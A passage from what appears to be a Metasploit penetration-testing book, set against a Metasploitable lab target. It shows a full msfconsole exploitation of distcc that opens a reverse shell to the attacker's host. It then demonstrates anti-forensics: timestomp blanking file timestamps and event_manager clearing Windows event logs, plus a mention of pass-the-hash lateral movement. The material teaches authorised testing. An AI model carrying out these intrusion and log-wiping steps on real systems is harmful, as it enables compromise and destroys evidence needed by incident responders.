+msf exploit(distcc_exec) &gt; <strong class="calibre3"><code class="calibre6">set LHOST 172.16.32.129</code></strong>
+LHOST =&gt; 172.16.32.129
+shomsf exploit(distcc_exec) &gt; <strong class="calibre3"><code class="calibre6">set RHOST 172.16.32.162</code></strong>
+RHOST =&gt; 172.16.32.162
+msf exploit(distcc_exec) &gt; <strong class="calibre3"><code class="calibre6">show payloads</code></strong>
+
+Compatible Payloads
+===================
+
+   Name                   Rank    Description
+   ----                   ----    -----------
+   cmd/unix/bind_perl     normal  Unix Command Shell, Bind TCP (via perl)
+   cmd/unix/bind_ruby     normal  Unix Command Shell, Bind TCP (via Ruby)
+   cmd/unix/generic       normal  Unix Command, Generic command execution
+   cmd/unix/reverse       normal  Unix Command Shell, Double reverse TCP (telnet)
+   cmd/unix/reverse_perl  normal  Unix Command Shell, Reverse TCP (via perl)
+   cmd/unix/reverse_ruby  normal  Unix Command Shell, Reverse TCP (via Ruby)
+
+msf exploit(distcc_exec) &gt; <strong class="calibre3"><code class="calibre6">set payload cmd/unix/reverse</code></strong>
+payload =&gt; cmd/unix/reverse
+msf exploit(distcc_exec) &gt; <strong class="calibre3"><code class="calibre6">exploit</code></strong>
+
+[*] Started reverse double handler
+[*] Accepted the first client connection...
+[*] Accepted the second client connection...
+[*] Command: echo q6Td9oaTrOkXsBXS;
+[*] Writing to socket A
+[*] Writing to socket B
+[*] Reading from sockets...
+[*] Reading from socket A
+[*] A: "q6Td9oaTrOkXsBXS\r\n"
+[*] Matching...
+[*] B is input...
+[*] Command shell session 2 opened (172.16.32.129:4444 -&gt;
+ 172.16.32.162:47002) at 2010-05-    22 00:08:04 −0400
+
+<strong class="calibre3"><code class="calibre6">whoami</code></strong>
+daemon
+<strong class="calibre3"><code class="calibre6">mkdir /root/moo</code></strong>
+mkdir: cannot create directory '/root/moo': Permission denied</pre><p class="calibre2">Notice above that we are still not at root. A local privilege exploit will further compromise the system and give full root access. We won’t tell you the answer here; use what you’ve learned in this book to gain root privileges successfully on the Metasploitable system. One hint is that you can find the exploit at Exploits Database (<a class="xref" href="http://www.exploit-db.com/" target="_top">http://www.exploit-db.com/</a>). Try getting a root Linux/Meterpreter shell on the system on your own.<a id="IDX-CHP-17-0062" class="strong"/><a id="IDX-CHP-17-0063" class="strong"/><a id="IDX-CHP-17-0064" class="strong"/><a id="IDX-CHP-17-0065" class="strong"/><a id="IDX-CHP-17-0066" class="strong"/></p></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="covering_your_tracks">Covering Your Tracks</h2></div></div></div><p class="calibre2">Having completed our attacks, our next step is to return to each exploited system to erase our tracks and clean up any mess we’ve left behind. Remnants of a Meterpreter shell or some other pieces of malware should be removed to avoid exposing the system further. For example, when we used the <code class="literal">PUT</code> command to compromise the Apache Tomcat instance, an attacker could use the exploit code left behind to compromise the system.</p><p class="calibre2">Sometimes, you will need to cover your tracks — for example, when testing the forensics analysis of a compromised system or an incident response program. In such cases, your goal is to thwart any forensics analysis or IDS. It’s often difficult to hide all your tracks, but you should be able to manipulate the system to confuse the examiner and make it almost impossible to identify the extent of the attack.<a id="IDX-CHP-17-0067" class="strong"/></p><p class="calibre2">In most cases, when forensics analysis is performed, if you can mangle the system so that it renders the majority of the examiner’s work almost unreadable and inconclusive, he will most likely identify the system as having been infected or compromised and might not understand how much information you were able to extract from the system. The best way to thwart forensic analysis is to wipe the system completely and rebuild it, removing all traces, but this is rare during a penetration test.</p><p class="calibre2">One benefit discussed in a number of chapters is the ability for Meterpreter to reside purely in memory. Often, you’ll find it challenging to detect and react to Meterpreter in memory space. Although research often suggests ways to detect a Meterpreter payload, the Metasploit crew typically responds with a new way to hide Meterpreter.</p><p class="calibre2">This is the same cat-and-mouse game that antivirus software vendors play with new releases of Meterpreter. When a new encoder or method for obfuscating a payload is released, vendors can take several months to detect the issues and update their product signatures to catch them. In most cases, it’s relatively difficult for most forensics analysts to identify a purely memory-resident attack vector from Metasploit.</p><p class="calibre2">We won’t offer in-depth information about covering your tracks, but a couple of Metasploit features are worth mentioning: <span class="strong"><em class="calibre4">timestomp</em></span> and <span class="strong"><em class="calibre4">event_manager</em></span>. <span class="strong"><em class="calibre4">Timestomp</em></span> is a Meterpreter plug-in that allows you to modify, erase, or set certain attributes on files. Let’s run <span class="strong"><em class="calibre4">timestomp</em></span> first:</p><a id="I_programlisting17_d1e20222" class="strong"/><pre class="programlisting">meterpreter &gt; <strong class="calibre3"><code class="calibre6">timestomp</code></strong>
+
+Usage: timestomp file_path OPTIONS
+
+OPTIONS:
+
+    -a &lt;opt&gt;  Set the "last accessed" time of the file
+    -b        Set the MACE timestamps so that EnCase shows blanks
+    -c &lt;opt&gt;  Set the "creation" time of the file
+    -e &lt;opt&gt;  Set the "mft entry modified" time of the file
+    -f &lt;opt&gt;  Set the MACE of attributes equal to the supplied file
+    -h        Help banner
+    -m &lt;opt&gt;  Set the "last written" time of the file
+    -r        Set the MACE timestamps recursively on a directory
+    -v        Display the UTC MACE values of the file
+    -z &lt;opt&gt;  Set all four attributes (MACE) of the file
+
+
+meterpreter &gt; <strong class="calibre3"><code class="calibre6">timestomp C:\\boot.ini -b</code></strong>
+[*] Blanking file MACE attributes on C:\boot.ini
+meterpreter &gt;</pre><p class="calibre2">In this example, we changed the timestamp so that when Encase (a popular forensics analysis tool) is used, the timestamps are blank.<a id="IDX-CHP-17-0068" class="strong"/><a id="IDX-CHP-17-0069" class="strong"/></p><p class="calibre2">The tool <span class="strong"><em class="calibre4">event_manager</em></span> will modify event logs so that they don’t show any information that might reveal that an attack occurred. Here it is in action:</p><a id="I_programlisting17_d1e20243" class="strong"/><pre class="programlisting">meterpreter &gt; <strong class="calibre3"><code class="calibre6">run event_manager</code></strong>
+Meterpreter Script for Windows Event Log Query and Clear.
+
+OPTIONS:
+
+    -c &lt;opt&gt;  Clear a given Event Log (or ALL if no argument specified)
+    -f &lt;opt&gt;  Event ID to filter events on
+    -h        Help menu
+    -i        Show information about Event Logs on the System and their configuration
+    -l &lt;opt&gt;  List a given Event Log.
+    -p        Supress printing filtered logs to screen
+    -s &lt;opt&gt;  Save logs to local CSV file,
+ optionally specify alternate folder in which to               save logs
+
+meterpreter &gt; <strong class="calibre3"><code class="calibre6">run event_manager -c</code></strong>
+[-] You must specify an eventlog to query!
+[*] Application:
+[*] Clearing Application
+[*] Event Log Application Cleared!
+[*] MailCarrier 2.0:
+[*] Clearing MailCarrier 2.0
+[*] Event Log MailCarrier 2.0 Cleared!
+[*] Security:
+[*] Clearing Security
+[*] Event Log Security Cleared!
+[*] System:
+[*] Clearing System
+[*] Event Log System Cleared!
+meterpreter &gt;</pre><p class="calibre2">In this example, we clear all the event logs, but the examiner might notice other interesting things on the system that could alert him to an attack. In general though, the examiner will not be able to piece together the puzzle to identify what happened during the attack, but he will know that something bad had occurred.</p><p class="calibre2">Remember to document your changes to a target system to make it easier to cover your tracks. Usually, you’ll leave a small sliver of information on the system, so you might as well make it extremely difficult for the incident response and forensics analysis team to find it.</p></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="wrapping_up-id8">Wrapping Up</h2></div></div></div><p class="calibre2">Having gotten this far, we could continue to attack other machines on the internal network using Metasploit and Meterpreter, with our attacks limited only by our creativity and ability. If this were a larger network, we could further penetrate the network using information gathered from various systems on the network.</p><p class="calibre2">For example, earlier in this chapter we compromised a Windows-based system. We could use the Meterpreter console to extract the hash values from that system and then use those credentials to authenticate to other Windows-based systems. The local administrator account is almost always the same from one system to another, so even in a corporate environment, we could use the information from one system to bridge attacks to another.</p><p class="calibre2">Penetration testing requires you to think outside the box and combine pieces of a puzzle. We used one method during this chapter, but there are probably several different ways to get into the systems and different avenues of attack you can leverage. This all comes with experience and spending the time to become creative. Persistence is key to penetration testing.</p><p class="calibre2">Remember to establish a fundamental set of methodologies you are comfortable with, but change them as necessary. Often, penetration testers change their methodologies at least once per test to stay fresh. Changes might include a new way of attacking a system or use of a new method. Regardless of the method you choose, remember that you can accomplish anything in this field with a bit of experience and hard work.</p></div></section></body></html>
